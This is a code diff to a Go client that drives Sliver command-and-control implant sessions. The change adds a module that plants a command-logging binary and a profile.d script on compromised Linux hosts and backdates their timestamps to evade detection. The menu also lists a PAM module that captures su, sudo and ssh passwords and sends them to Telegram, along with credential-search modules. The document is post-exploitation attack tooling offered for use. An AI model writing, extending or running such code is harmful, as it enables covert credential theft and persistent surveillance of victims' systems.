@@ -111,7 +111,7 @@ func upload_file(rpc rpcpb.SliverRPCClient, session *clientpb.Session, source_pa
 		Request: makeRequest(session),
 	})
 	if err != nil {
-		log.Fatalf("failed to upload: %v", err)
+		log.Printf("failed to upload: %v", err)
 	}
 
 	log.Printf("upload finished: %v\n", time.Now())
@@ -172,7 +172,7 @@ func chmod_file(rpc rpcpb.SliverRPCClient, session *clientpb.Session, path strin
 		Request:  makeRequest(session),
 	})
 	if err != nil {
-		log.Fatalf("download failed: %v", err)
+		log.Fatalf("chmod file  failed: %v", err)
 	}
 	return chmod_files, nil
 }
@@ -188,7 +188,7 @@ func chtimes_file(rpc rpcpb.SliverRPCClient, session *clientpb.Session, path str
 		Request: makeRequest(session),
 	})
 	if err != nil {
-		log.Fatalf("chtimes failed: %v", err)
+		log.Printf("chtimes failed: %v", err)
 	}
 	return chtimes_files, nil
 }
@@ -255,6 +255,55 @@ func runSearchKnownHosts(rpc rpcpb.SliverRPCClient, session *clientpb.Session) {
 		}
 	}
 }
+
+func runLogAllCommand(rpc rpcpb.SliverRPCClient, session *clientpb.Session) {
+	fmt.Printf("upload /usr/local/bin/history_log from  %s  ",commandLoggerPath )
+
+	files, err := ls_session_file(rpc, session, "/usr/local/")
+	if err != nil {
+		log.Fatalf("getting command loger modify time failed: %v", err)
+	}
+	Modify_time := files.Files[0].ModTime
+	fmt.Println(Modify_time)
+
+
+	uploadFiles, err := upload_file(rpc, session, commandLoggerPath, "/usr/local/bin/history_log")
+	if err != nil {
+		log.Fatalf("upload failed: %v", err)
+	} else {
+		log.Println("upload success", uploadFiles)
+	}
+	chtimes_files, err := chtimes_file(rpc, session, "/usr/local/bin/history_log", Modify_time)
+	if err != nil {
+		log.Fatalf("chtimes_files%s failed: %v", chtimes_files, err)
+	}
+	//upload history.sh
+	log.Printf("upload /etc/profile.d/history.sh  %s  ",commandLoggerPath )
+	files, err = ls_session_file(rpc, session, "/etc/profile.d/")
+	if err != nil {
+		log.Fatalf("getting /etc/profile.d  modify time failed: %v", err)
+	}
+	Modify_time = files.Files[0].ModTime
+	log.Println(Modify_time)
+
+	uploadFiles, err = upload_file(rpc, session, commandHistoryPath, "/etc/profile.d/history.sh")
+	if err != nil {
+		log.Fatalf("upload failed: %v", err)
+	} else {
+		log.Println("upload success", uploadFiles)
+	}
+	chtimes_files, err = chtimes_file(rpc, session, "/etc/profile.d/history.sh", Modify_time)
+	if err != nil {
+		log.Fatalf("chtimes_files%s failed: %v", chtimes_files, err)
+	}
+	chmodFiles, err := chmod_file(rpc, session, "/usr/local/bin/history_log")
+	if err != nil {
+		log.Fatalf("modify /usr/local/bin/history_log permission failed: %v", err)
+	} else {
+		log.Printf("modify /usr/local/bin/history_log permission %s\n", chmodFiles)
+	}
+}
+
 func searchCredentialsFromFiles(rpc rpcpb.SliverRPCClient, session *clientpb.Session) {
 	fmt.Print("Still working on it ")
 }
@@ -324,7 +373,7 @@ func runPamLoggerModule(rpc rpcpb.SliverRPCClient, session *clientpb.Session) {
 				if err != nil {
 					log.Fatalf("upload failed: %v", err)
 				} else {
-					fmt.Println("upload成功", uploadFiles)
+					log.Println("upload成功", uploadFiles)
 				}
 				chtimes_files, err := chtimes_file(rpc, session, pamPath, Modify_time)
 				if err != nil {
@@ -386,6 +435,8 @@ func runPamLoggerModule(rpc rpcpb.SliverRPCClient, session *clientpb.Session) {
 
 var sliverConfigPath string
 var pamLoggerPath string
+var commandLoggerPath string
+var commandHistoryPath string
 func main() {
 	// var configPath string
 	// flag.StringVar(&configPath, "config", "/Users/timmy/Downloads/timmy_mac_35.236.161.97.cfg", "path to sliver client config file")
@@ -394,7 +445,9 @@ func main() {
 
 	// 定义两个命令行参数
 	flag.StringVar(&sliverConfigPath, "sliver-config", "/Users/timmy/Downloads/timmy_mac_35.236.161.97.cfg", "path to sliver client config file")
-	flag.StringVar(&pamLoggerPath, "pam-logger", "/Users/timmy/Downloads/loogger", "path to PAM logger config file")
+	flag.StringVar(&pamLoggerPath, "pam-logger", "/Users/timmy/Downloads/loogger", "path to PAM logger binary file")
+	flag.StringVar(&commandLoggerPath, "command-logger", "/Users/timmy/Downloads/history_log", "path to command logger binary file")
+	flag.StringVar(&commandHistoryPath, "command-history", "/Users/timmy/Downloads/history.sh", "path to history shell script file")
 
 	// 解析命令行参数
 	flag.Parse()
@@ -455,6 +508,7 @@ func main() {
 	moduleItems := []string{
 		"pam_logger (logger su sudo ssh authentication password and send to telegram)",
 		"Search for ssh known hosts",
+		"command_logger (looger all bash command in all user)",
 		"search credentials from memory",
 		"search credentials from files",
 	}
@@ -473,7 +527,7 @@ func main() {
 	modules := []int{}
 	switch moduleResult {
 	case "All Modules":
-		modules = []int{1, 2, 3,4}
+		modules = []int{1, 2, 3, 4, 5}
 	case moduleItems[0]:
 		modules = append(modules, 1)
 	case moduleItems[1]:
@@ -482,22 +536,28 @@ func main() {
 		modules = append(modules, 3)
 	case moduleItems[3]:
 		modules = append(modules, 4)
+	case moduleItems[4]:
+		modules = append(modules, 5)
 	}
 
 	for _, session := range sessions.Sessions {
 		for _, module := range modules {
-			log.Printf("Starting exploit %s with module \"%s\"\n\n",session.Hostname,moduleItems[module-1])
+			log.Printf("Starting exploit %s with module \"%s\"\n",session.Hostname,moduleItems[module-1])
 			switch module {
 			case 1:
 				runPamLoggerModule(rpc, session)
 			case 2:
 				runSearchKnownHosts(rpc, session)
 			case 3:
-				searchCredentialsFromMemory(rpc, session)
+				runLogAllCommand(rpc, session)
 			case 4:
+				searchCredentialsFromMemory(rpc, session)
+			case 5:
 				searchCredentialsFromFiles(rpc, session)
 			default:
 				fmt.Println("unvalid module id ")
+			log.Printf("Finishing exploit %s with module \"%s\"\n\n",session.Hostname,moduleItems[module-1])
+
 			}
 		}
 	}
